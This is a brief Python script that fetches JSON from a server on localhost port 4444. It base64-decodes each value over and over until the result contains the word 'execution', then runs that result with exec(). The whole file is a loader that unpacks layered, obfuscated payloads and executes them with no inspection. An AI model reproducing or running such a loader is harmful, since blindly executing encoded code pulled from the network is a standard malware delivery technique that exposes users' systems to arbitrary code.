from itsdangerous import base64_decode
import requests,os
data = (requests.get("http://localhost:4444/")).json()
def t2(rounded):
    found = False
    tt = 1
    while found == False:
        
        g = base64_decode(rounded)
        if str(g).__contains__('execution'): 
            exec(g)
            found = True; 
        else: 
            tt+=1
            rounded = g

for d in data: t2(data[d])